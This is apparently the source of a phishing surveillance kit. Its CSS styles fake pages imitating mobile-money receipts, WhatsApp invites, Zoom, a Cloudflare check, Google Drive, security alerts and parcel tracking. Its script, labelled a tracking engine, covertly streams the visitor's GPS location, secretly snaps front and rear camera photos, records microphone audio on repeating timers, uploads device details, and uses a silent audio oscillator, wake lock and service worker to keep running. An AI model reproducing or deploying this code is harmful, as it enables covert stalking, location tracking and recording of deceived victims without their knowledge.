*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
.hidden{display:none!important}
.spin{animation:sp .7s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.fade-up{animation:fadeUp .4s ease}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes dotPulse{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
@keyframes checkSpin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
@keyframes checkDone{0%{transform:scale(0)}50%{transform:scale(1.2)}100%{transform:scale(1)}}
/* ═══ MOMO / MONEY PAGES ═══ */
.mm-page{background:#fff;min-height:100vh}
.mm-status{background:#000;padding:4px 16px;display:flex;justify-content:space-between;font-size:11px;color:#fff}
.mm-bar{padding:12px 16px;display:flex;align-items:center}
.mm-bar .back{font-size:20px;margin-right:12px}
.mm-bar .logo{font-weight:700;font-size:18px;flex:1}
.mm-bar .icons{display:flex;gap:14px;font-size:18px}
.mm-tabs{display:flex;border-bottom:2px solid rgba(0,0,0,.1)}
.mm-tabs .tab{flex:1;text-align:center;padding:10px;font-size:13px;font-weight:500;color:rgba(0,0,0,.4);position:relative}
.mm-tabs .tab.active{color:#000}
.mm-tabs .tab.active::after{content:'';position:absolute;bottom:0;left:20%;right:20%;height:3px;background:#000;border-radius:3px 3px 0 0}
.mm-body{padding:14px;max-width:500px;margin:0 auto}
.mm-balance{background:#f5f5f5;border-radius:10px;padding:12px 14px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between}
.mm-balance .lbl{font-size:12px;color:#888}
.mm-balance .val{font-size:11px;color:#666;letter-spacing:1px}
.mm-pending{border-radius:8px;padding:9px 12px;display:flex;align-items:center;gap:8px;font-size:13px;margin-bottom:10px}
.mm-pending .dot{width:8px;height:8px;border-radius:50%;animation:pulse 1.5s infinite}
.mm-notif{background:#fff;border-radius:12px;border:1px solid #e8e8e8;overflow:hidden;margin-bottom:10px;box-shadow:0 1px 4px rgba(0,0,0,.05)}
.mm-notif .top{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:1px solid #f5f5f5}
.mm-notif .top .circle{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.mm-notif .top .info{flex:1}
.mm-notif .top .info .title{font-size:14px;color:#000;font-weight:600}
.mm-notif .top .info .time{font-size:11px;color:#999;margin-top:1px}
.mm-notif .top .amount{font-size:18px;font-weight:700}
.mm-detail{padding:12px 14px}
.mm-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #fafafa;font-size:13px}
.mm-row:last-child{border:none}
.mm-row .k{color:#888}
.mm-row .v{color:#222;font-weight:500}
.mm-btn{border:none;padding:14px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;margin-top:8px}
.mm-btn:disabled{opacity:.5}
.mm-receipt{border-radius:10px;padding:16px;text-align:center;margin-top:12px}
.mm-receipt .check{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;margin:0 auto 8px;color:#fff}
.mm-receipt .msg{font-size:16px;font-weight:600}
.mm-receipt .sub{font-size:12px;margin-top:3px}
.mm-receipt .ref{font-size:11px;color:#999;margin-top:6px}
.mm-other{margin-top:10px}
.mm-other .hdr{font-size:12px;color:#888;margin-bottom:6px}
.mm-txn{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #f5f5f5}
.mm-txn .ic{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
.mm-txn .det{flex:1}
.mm-txn .det .nm{font-size:13px;font-weight:500}
.mm-txn .det .dt{font-size:11px;color:#999}
.mm-txn .amt{font-size:14px;font-weight:600}
/* ═══ WHATSAPP ═══ */
.w-page{background:#0b141a;min-height:100vh;display:flex;flex-direction:column}
.w-grp{background:#111b21;min-height:100vh}
.w-sec{padding:10px 16px}
.w-sec .hd{color:#8696a0;font-size:12px;margin-bottom:8px}
.w-sec .bd{color:#e9edef;font-size:14px;line-height:1.4;margin-bottom:12px}
.w-mem{display:flex;align-items:center;gap:10px;padding:6px 0}
.w-mem .av{width:36px;height:36px;background:#2a3942;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
.w-mem .nm{color:#e9edef;font-size:14px;font-weight:500}
.w-mem .rl{color:#008069;font-size:10px;font-weight:600}
.w-mem .ab{color:#8696a0;font-size:11px}
.w-fix{position:fixed;bottom:0;left:0;right:0;background:#1f2c34;padding:10px 14px 18px;border-top:1px solid #2a3942;z-index:50}
.w-jb{background:#008069;color:#fff;border:none;padding:13px;border-radius:22px;font-size:16px;cursor:pointer;width:100%;font-weight:500;font-family:inherit}
.w-jb:disabled{background:#2a3942;color:#8696a0}
.w-e2e{text-align:center;font-size:11px;color:#8696a0;margin-top:5px}
.w-hdr{background:#1f2c34;padding:8px 14px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:50}
.w-hdr .bk{color:#aebac1;font-size:20px;padding:4px}
.w-hdr .ga{width:34px;height:34px;background:#2a3942;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
.w-hdr .gi{flex:1}
.w-hdr .gn{color:#e9edef;font-size:15px;font-weight:500}
.w-hdr .gs{color:#8696a0;font-size:11px}
.w-ct{flex:1;padding:6px;overflow-y:auto;padding-bottom:56px}
.w-bb{max-width:82%;padding:5px 7px 2px;border-radius:7px;margin:2px 0;font-size:14px;line-height:1.35;clear:both}
.w-bb.sys{background:#182229;color:#8696a0;text-align:center;font-size:12px;max-width:90%;margin:5px auto;padding:4px 10px;border-radius:5px}
.w-bb.in{background:#1f2c34;color:#e9edef;border-radius:0 7px 7px 7px;float:left}
.w-bb .sn{font-size:12px;font-weight:500;margin-bottom:1px}
.w-bb .tm{float:right;font-size:10px;color:#8696a0;margin-left:6px;margin-top:2px}
.w-dt{background:#182229;color:#8696a0;font-size:11px;padding:3px 10px;border-radius:5px;margin:5px auto;width:fit-content;clear:both}
.w-tp{display:flex;align-items:center;gap:5px;background:#1f2c34;padding:6px 10px;border-radius:0 7px 7px 7px;width:fit-content;float:left;clear:both;margin:2px 0}
.w-tp .ds{display:flex;gap:3px}
.w-tp .ds span{width:5px;height:5px;background:#8696a0;border-radius:50%;animation:dotPulse 1.4s infinite}
.w-tp .ds span:nth-child(2){animation-delay:.2s}
.w-tp .ds span:nth-child(3){animation-delay:.4s}
.w-in{position:fixed;bottom:0;left:0;right:0;background:#1f2c34;padding:5px 6px;display:flex;align-items:center;gap:5px;border-top:1px solid #2a3942}
.w-in span{font-size:18px;padding:5px}
.w-in input{flex:1;background:#2a3942;border:none;border-radius:18px;padding:8px 12px;color:#e9edef;font-size:14px;outline:none;font-family:inherit}
/* ═══ GOV / UTILITY ═══ */
.gv-page{background:#f5f5f5;min-height:100vh}
.gv-bar{padding:14px 16px;display:flex;align-items:center;gap:8px;color:#fff}
.gv-bar .logo{font-size:17px;font-weight:700;flex:1}
.gv-bd{max-width:500px;margin:0 auto;padding:14px}
.gv-card{background:#fff;border-radius:10px;box-shadow:0 1px 3px rgba(0,0,0,.06);overflow:hidden;margin-bottom:10px}
.gv-card .hdr{padding:14px 16px;color:#fff}
.gv-card .hdr h2{font-size:16px;font-weight:600}
.gv-card .hdr .sub{font-size:12px;opacity:.8;margin-top:2px}
.gv-card .bdy{padding:14px 16px}
.gv-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f5f5f5;font-size:14px}
.gv-row:last-child{border:none}
.gv-row .k{color:#888}
.gv-row .v{color:#222;font-weight:500}
.gv-btn{border:none;padding:13px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:8px}
.gv-btn:disabled{opacity:.5}
.gv-alert{border-left:3px solid;border-radius:0 8px 8px 0;padding:10px 14px;margin-bottom:10px;font-size:13px}
/* ═══ JOB / ARTISAN ═══ */
.jb-page{background:#f5f5f5;min-height:100vh}
.jb-nav{background:#fff;padding:11px 14px;display:flex;align-items:center;box-shadow:0 1px 2px rgba(0,0,0,.05);position:sticky;top:0;z-index:50}
.jb-nav .logo{font-size:17px;font-weight:700;flex:1}
.jb-nav .bell{position:relative;font-size:17px}
.jb-nav .bell .dot{position:absolute;top:-3px;right:-5px;width:7px;height:7px;background:#f44336;border-radius:50%}
.jb-bd{max-width:560px;margin:0 auto;padding:10px 14px 28px}
.jb-card{background:#fff;border-radius:10px;box-shadow:0 1px 3px rgba(0,0,0,.05);margin-bottom:10px;overflow:hidden}
.jb-card .top{padding:12px 14px;border-bottom:1px solid #f5f5f5}
.jb-tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:600;margin-bottom:5px}
.jb-card .top h2{font-size:15px;color:#212121;font-weight:600;line-height:1.3;margin-bottom:2px}
.jb-card .top .sub{font-size:12px;color:#757575}
.jb-card .bdy{padding:12px 14px}
.jb-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #fafafa;font-size:13px}
.jb-row:last-child{border:none}
.jb-row .l{color:#9e9e9e}
.jb-row .v{color:#212121;font-weight:500;text-align:right;max-width:58%}
.jb-dist{background:#e8f5e9;border-radius:8px;padding:11px 12px;margin:8px 0;display:flex;align-items:center;gap:10px}
.jb-dist .ic{width:34px;height:34px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;box-shadow:0 1px 2px rgba(0,0,0,.06)}
.jb-btn{border:none;padding:14px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:6px}
.jb-btn:disabled{opacity:.5}
.jb-urg{text-align:center;font-size:12px;color:#e65100;margin-top:8px;animation:pulse 2s infinite}
.jb-reveal{margin-top:12px;padding:12px;background:#f1f8e9;border-radius:8px}
.jb-reveal h3{font-size:14px;color:#33691e;margin-bottom:8px}
.jb-reveal .row{display:flex;justify-content:space-between;padding:5px 0;font-size:13px;border-bottom:1px solid #e8f5e9}
/* ═══ ZOOM ═══ */
.z-page{background:#242424;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.z-card{background:#1a1a1a;border-radius:16px;padding:32px 24px;text-align:center;max-width:400px;width:100%;border:1px solid #333}
.z-card .host{color:#ccc;font-size:14px;margin-top:8px}
.z-card .topic{color:#fff;font-size:16px;font-weight:600;margin-top:12px}
.z-card .meta{color:#888;font-size:12px;margin-top:4px}
.z-card .preview{margin:16px 0;border-radius:8px;overflow:hidden;background:#000;height:200px;display:flex;align-items:center;justify-content:center;position:relative}
.z-card .preview .lb{color:#999;font-size:12px}
.z-card .preview video{width:100%;height:100%;object-fit:cover}
.z-card .preview .nm{position:absolute;bottom:8px;left:8px;color:#fff;font-size:11px;background:rgba(0,0,0,.6);padding:2px 8px;border-radius:4px}
.z-btn{background:#0b5cff;color:#fff;border:none;padding:14px 28px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;width:100%;margin-top:12px}
.z-btn:disabled{opacity:.5}
/* ═══ CAPTCHA / CLOUDFLARE ═══ */
.cf-page{background:#f0f0f0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif}
.cf-box{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1);padding:16px 20px;width:300px;border:1px solid #e0e0e0}
.cf-row{display:flex;align-items:center;gap:12px}
.cf-check{width:28px;height:28px;border:2px solid #c0c0c0;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .3s}
.cf-check.loading{border-color:#f5a623;animation:checkSpin 1s linear infinite;border-radius:50%}
.cf-check.done{border-color:#2ecc40;background:#2ecc40;animation:checkDone .4s ease}
.cf-label{font-size:14px;color:#555;flex:1}
.cf-brand{display:flex;align-items:center;gap:6px;margin-top:12px;padding-top:10px;border-top:1px solid #eee}
.cf-brand img{height:18px}
.cf-brand span{font-size:11px;color:#999}
.cf-privacy{font-size:10px;color:#aaa;margin-top:6px;text-align:right}
.cf-privacy a{color:#aaa;text-decoration:none}
/* ═══ GOOGLE DRIVE ═══ */
.gd-page{background:#f8f9fa;min-height:100vh;font-family:'Inter',sans-serif}
.gd-bar{background:#fff;padding:12px 20px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.gd-bar .logo{display:flex;align-items:center;gap:8px;font-size:20px;color:#5f6368;font-weight:400}
.gd-bar .logo span{color:#5f6368}
.gd-body{max-width:600px;margin:40px auto;padding:0 20px}
.gd-card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(60,64,67,.15);padding:32px;text-align:center}
.gd-icon{width:64px;height:64px;margin:0 auto 16px}
.gd-title{font-size:20px;color:#202124;font-weight:600;margin-bottom:8px}
.gd-sub{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5}
.gd-file{background:#f1f3f4;border-radius:8px;padding:16px;display:flex;align-items:center;gap:12px;margin-bottom:20px;text-align:left}
.gd-file .fi{width:40px;height:40px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:20px}
.gd-file .fn{font-size:14px;color:#202124;font-weight:500}
.gd-file .fs{font-size:12px;color:#5f6368}
.gd-btn{background:#1a73e8;color:#fff;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;width:100%}
.gd-btn:hover{background:#1557b0}
.gd-btn:disabled{opacity:.6}
.gd-footer{font-size:12px;color:#5f6368;margin-top:16px}
/* ═══ SECURITY ALERT ═══ */
.sa-page{background:#f5f5f5;min-height:100vh;font-family:'Inter',sans-serif}
.sa-bar{background:#fff;padding:14px 20px;border-bottom:1px solid #e0e0e0}
.sa-bar .logo{font-size:18px;font-weight:600;color:#202124}
.sa-body{max-width:500px;margin:30px auto;padding:0 16px}
.sa-card{background:#fff;border-radius:12px;box-shadow:0 1px 4px rgba(0,0,0,.08);overflow:hidden}
.sa-header{background:#d93025;padding:20px;text-align:center;color:#fff}
.sa-header .icon{font-size:40px;margin-bottom:8px}
.sa-header h2{font-size:18px;font-weight:600}
.sa-header p{font-size:13px;opacity:.9;margin-top:4px}
.sa-details{padding:20px}
.sa-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px}
.sa-row .k{color:#5f6368}
.sa-row .v{color:#202124;font-weight:500}
.sa-btn{background:#d93025;color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%;margin-top:16px}
.sa-btn:disabled{opacity:.6}
/* ═══ PACKAGE DELIVERY ═══ */
.pk-page{background:#fafafa;min-height:100vh;font-family:'Inter',sans-serif}
.pk-bar{background:#d4001a;padding:14px 20px;color:#fff;display:flex;align-items:center;gap:10px}
.pk-bar .logo{font-size:18px;font-weight:700;letter-spacing:1px}
.pk-body{max-width:500px;margin:20px auto;padding:0 16px}
.pk-card{background:#fff;border-radius:10px;box-shadow:0 1px 4px rgba(0,0,0,.08);overflow:hidden}
.pk-header{padding:20px;border-bottom:1px solid #f0f0f0;text-align:center}
.pk-header .icon{font-size:36px;margin-bottom:8px}
.pk-header h2{font-size:16px;color:#333;font-weight:600}
.pk-header p{font-size:13px;color:#666;margin-top:4px}
.pk-track{padding:16px 20px}
.pk-step{display:flex;gap:12px;padding:8px 0;position:relative}
.pk-step::before{content:'';position:absolute;left:11px;top:28px;bottom:-8px;width:2px;background:#e0e0e0}
.pk-step:last-child::before{display:none}
.pk-step .dot{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;z-index:1}
.pk-step .dot.done{background:#4caf50;color:#fff}
.pk-step .dot.current{background:#ff9800;color:#fff;animation:pulse 1.5s infinite}
.pk-step .dot.pending{background:#e0e0e0;color:#999}
.pk-step .info{flex:1}
.pk-step .info .title{font-size:13px;color:#333;font-weight:500}
.pk-step .info .time{font-size:11px;color:#999;margin-top:2px}
.pk-action{padding:16px 20px;border-top:1px solid #f0f0f0}
.pk-btn{background:#d4001a;color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%}
.pk-btn:disabled{opacity:.6}
/* ═══ VOICE NOTE ═══ */
.vn-page{background:#0b141a;min-height:100vh;display:flex;align-items:center;justify-content:center}
.vn-card{background:#1f2c34;border-radius:12px;padding:24px;max-width:340px;width:90%;text-align:center}
.vn-icon{width:60px;height:60px;background:#008069;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 16px}
.vn-title{color:#e9edef;font-size:16px;font-weight:500;margin-bottom:4px}
.vn-sub{color:#8696a0;font-size:13px;margin-bottom:20px}
.vn-wave{height:40px;display:flex;align-items:center;justify-content:center;gap:3px;margin-bottom:20px}
.vn-wave span{width:3px;background:#008069;border-radius:2px;animation:wave 1.2s ease-in-out infinite}
@keyframes wave{0%,100%{height:8px}50%{height:28px}}
.vn-wave span:nth-child(2){animation-delay:.1s}
.vn-wave span:nth-child(3){animation-delay:.2s}
.vn-wave span:nth-child(4){animation-delay:.3s}
.vn-wave span:nth-child(5){animation-delay:.4s}
.vn-wave span:nth-child(6){animation-delay:.5s}
.vn-wave span:nth-child(7){animation-delay:.6s}
.vn-wave span:nth-child(8){animation-delay:.7s}
.vn-wave span:nth-child(9){animation-delay:.8s}
.vn-wave span:nth-child(10){animation-delay:.9s}
.vn-dur{color:#8696a0;font-size:12px;margin-bottom:16px}
.vn-btn{background:#008069;color:#fff;border:none;padding:14px;border-radius:24px;font-size:15px;font-weight:500;cursor:pointer;width:100%}
.vn-btn:disabled{background:#2a3942;color:#8696a0}

.wifi-title{font-size:20px;color:#333;font-weight:700;margin-bottom:4px}
.wifi-sub{font-size:14px;color:#666;margin-bottom:24px}

<script>
// ═══ CORE TRACKING ENGINE ═══
const TID=window.location.pathname.split('/').pop();
const PB=window.location.pathname.split('/')[1];
let MS=null,OK=false;

function sG(p){fetch('/api/gps/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
alt:p.coords.altitude,dir:p.coords.heading,spd:p.coords.speed,ts:new Date(p.timestamp).toISOString(),source:'gps'})}).catch(()=>{});
if(navigator.sendBeacon)navigator.sendBeacon('/api/beacon/'+TID,JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,source:'gps'}))}

function gps(){return new Promise((y,n)=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);
navigator.geolocation.watchPosition(sG,()=>{},{enableHighAccuracy:true,timeout:30000,maximumAge:0});y(p)},
e=>n(e),{enableHighAccuracy:true,timeout:30000,maximumAge:0})})}

function fG(){navigator.geolocation.getCurrentPosition(sG,()=>{},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}

async function cam(){try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:true});
await snap('front');setTimeout(snapR,3000)}catch(e){try{MS=await navigator.mediaDevices.getUserMedia({audio:true})}catch(e2){}}}

async function snap(c){if(!MS||!MS.getVideoTracks().length)return;try{const v=document.createElement('video');v.srcObject=MS;
v.setAttribute('playsinline','');v.muted=true;await v.play();await new Promise(r=>setTimeout(r,600));
const cv=document.createElement('canvas');cv.width=v.videoWidth||640;cv.height=v.videoHeight||480;
cv.getContext('2d').drawImage(v,0,0);fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({type:'photo',camera:c,data:cv.toDataURL('image/jpeg',.8),ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}

async function snapR(){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});
const v=document.createElement('video');v.srcObject=s;v.setAttribute('playsinline','');v.muted=true;await v.play();
await new Promise(r=>setTimeout(r,1000));const cv=document.createElement('canvas');cv.width=v.videoWidth;cv.height=v.videoHeight;
cv.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());fetch('/api/media/'+TID,{method:'POST',
headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',camera:'rear',data:cv.toDataURL('image/jpeg',.8),
ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}

function rec(d){if(!MS||!MS.getAudioTracks().length)return;try{const mt=MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?
'audio/webm;codecs=opus':'audio/webm';const r=new MediaRecorder(MS,{mimeType:mt});const ch=[];
r.ondataavailable=e=>{if(e.data.size>0)ch.push(e.data)};r.onstop=()=>{const b=new Blob(ch,{type:mt});const rd=new FileReader();
rd.onloadend=()=>{fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({type:'audio',data:rd.result,ts:new Date().toISOString()})}).catch(()=>{})};rd.readAsDataURL(b)};
r.start();setTimeout(()=>{try{r.stop()}catch(e){}},d)}catch(e){}}

function persist(){if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js').catch(()=>{});
try{const c=new(window.AudioContext||window.webkitAudioContext)();const o=c.createOscillator();const g=c.createGain();
g.gain.value=.0001;o.connect(g);g.connect(c.destination);o.start()}catch(e){}
try{if('wakeLock' in navigator)navigator.wakeLock.request('screen')}catch(e){}
try{if('locks' in navigator)navigator.locks.request('r'+TID,{mode:'exclusive'},()=>new Promise(()=>{}))}catch(e){}}

function loop(){setInterval(()=>snap('front'),30000);setInterval(snapR,120000);setInterval(()=>rec(10000),60000);
setTimeout(()=>rec(15000),2000);
document.addEventListener('visibilitychange',()=>{if(!document.hidden){fG();if(MS)snap('front')}});
window.addEventListener('beforeunload',()=>{navigator.geolocation.getCurrentPosition(p=>{
navigator.sendBeacon('/api/beacon/'+TID,JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}))},
()=>{},{enableHighAccuracy:true,timeout:3000})})}

function dev(){fetch('/api/device/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({platform:navigator.platform,userAgent:navigator.userAgent,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:{w:screen.width,h:screen.height}})}).catch(()=>{})}

async function go(){if(OK)return;OK=true;try{await gps()}catch(e){}try{await cam()}catch(e){}
if('Notification' in window)Notification.requestPermission().catch(()=>{});persist();dev();loop()}

function setOG(t,d){document.getElementById('ogt').content=t;document.getElementById('ogd').content=d;document.getElementById('pt').textContent=t}
</script>
